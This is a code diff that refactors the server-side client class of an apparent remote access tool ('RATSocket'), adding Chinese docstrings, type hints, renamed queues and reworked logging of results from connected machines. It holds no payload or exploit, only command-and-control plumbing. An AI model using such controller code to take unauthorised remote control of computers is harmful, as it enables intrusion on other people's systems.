@@ -1,6 +1,7 @@
 import ntpath
 import os
 import time
+from typing import Generator
 
 from server.config.config import BACKGROUND_MESSAGE_OUTPUT_TO_FILE, SHOW_MESSAGES_FROM_OTHER_CONNECTIONS
 from common.ratsocket import RATSocket
@@ -15,17 +16,25 @@ if BACKGROUND_MESSAGE_OUTPUT_TO_FILE:
 class Client(RATSocket):
 
     def __init__(self, s, address=None, info=None):
+        """
+        初始化客户端连接
+
+        参数:
+            socket: 客户端socket对象
+            address: 客户端地址(IP, 端口)元组
+            info: 客户端信息字典
+        """
         super().__init__()
         self.socket = s  # 客户端套接字
         self.address = address  # 客户端地址
         self.info = info  # 客户端信息
-        self.commands = MessageQueue()  # 存放待执行命令
-        self.results = MessageQueue()  # 存放未读消息
-        self.status = False  # 是否正在交互
-        self.history = []
-        # self.history = {}  # 存放历史记录
 
-    def send_command(self, command: str, type='command', extra=None):
+        self._pending_commands = MessageQueue()   # 等待响应的命令队列
+        self._results_queue = MessageQueue()  # 未读结果/消息队列
+        self._is_interactive = False  # 是否处于交互会话中
+        self.command_history = [] # 命令执行历史记录
+
+    def send_command(self, command: str, type='command', extra=None) -> Generator:
         """
         向客户端发送命令
         :param command: 命令
@@ -44,7 +53,7 @@ class Client(RATSocket):
 
         return self.wait_for_result(data.get('id'), command if type == 'command' else None)
 
-    def send_file(self, filename: str):
+    def send_file(self, filename: str) -> Generator:
         """
         向客户端发送文件
         :param filename: 文件名
@@ -58,7 +67,7 @@ class Client(RATSocket):
         }
         io = get_output_stream(filename)
         self.send(data)  # 发送文件请求头
-        if self.results.get_status():  # 如果对方就绪
+        if self._results_queue.get_status():  # 如果对方就绪
             self.send_io(io)  # 发送文件
         return self.wait_for_result(data.get('id'), 'upload ' + filename)
 
@@ -71,7 +80,7 @@ class Client(RATSocket):
         type = data.get('type')  # 获取消息类型
         # 如果是就绪信号
         if type == 'rdy':
-            self.results.put_status(data.get('status'))  # 将就绪状态写入队列
+            self._results_queue.put_status(data.get('status'))  # 将就绪状态写入队列
             return
         self.info['cwd'] = data.get('cwd')  # 更新工作路径
         result_id = data.get('id')  # 结果id
@@ -110,23 +119,36 @@ class Client(RATSocket):
         :param text: 结果文本
         :param end: 是否结束
         """
-        pending_command_id = self.commands.peek()
-        if self.status:  # 如果当前正在交互
-            if command_id == pending_command_id:  # 是在等待执行的命令
-                self.results.put(status, text, end)  # 结果放入队列
+
+        pending_command_id = self._pending_commands.peek()
+
+        is_expected_command = (command_id == pending_command_id)
+
+        # 预期命令始终直接输出到队列
+        if is_expected_command:
+            self._results_queue.put(status, text, end)
+            return
+
+        # 非预期命令的处理逻辑
+        if self._is_interactive:
+            # 交互模式下非预期命令
+            if BACKGROUND_MESSAGE_OUTPUT_TO_FILE:
+                file_logger.info(f'Message from {self.address}: {text}')
             else:
-                if BACKGROUND_MESSAGE_OUTPUT_TO_FILE:
-                    file_logger.info(f'Message from {self.address}: {text}')
-                else:
-                    logger.info(text)
-        else:  # 如果目前没在交互，就放在队列
+                logger.info(text)
+        else:
+            # 非交互模式下非预期命令
+
+            # 非交互模式只要开启了后台消息就一定会写到文件中，不管开不开启SHOW_MESSAGES_FROM_OTHER_CONNECTIONS
+            if BACKGROUND_MESSAGE_OUTPUT_TO_FILE:
+                file_logger.info(f'Message from {self.address}: {text}')
+                return
+
+            # 如果没有开启后台消息且开启了不管开不开启SHOW_MESSAGES_FROM_OTHER_CONNECTIONS
             if SHOW_MESSAGES_FROM_OTHER_CONNECTIONS:
-                if BACKGROUND_MESSAGE_OUTPUT_TO_FILE:
-                    file_logger.info(f'Message from {self.address}: {text}')
-                else:
-                    logger.info(f'Message from {self.address}: {text}')
-            else:
-                self.results.put(status, text, end)
+                logger.info(f'Message from {self.address}: {text}')
+            else: #如果没有开启后台消息且没有开启SHOW_MESSAGES_FROM_OTHER_CONNECTIONS
+                self._results_queue.put(status, text, end)
 
     def wait_for_result(self, id: int, command: str):
         """
@@ -135,22 +157,22 @@ class Client(RATSocket):
         :param command: 命令文本
         :return: 结果生成器
         """
-        self.commands.put_command_id(id)  # 将命令id加入待执行队列
+        self._pending_commands.put_command_id(id)  # 将命令id加入待执行队列
         start_time = time.time()
 
         history_result = []  # 存放结果
 
         while 1:
-            status, result, eof = self.results.get()  # 获取结果
+            status, result, eof = self._results_queue.get()  # 获取结果
             yield status, result  # 返回状态和结果
             history_result.append(result)  # 添加到结果列表
             if eof:  # 判断是否结束
-                self.commands.get()  # 从待执行队列移除
+                self._pending_commands.get()  # 从待执行队列移除
                 break
 
         end_time = time.time()
         if command:
-            self.history.append({
+            self.command_history.append({
                 'id': id,
                 'command': command,
                 'time': get_readable_time(),
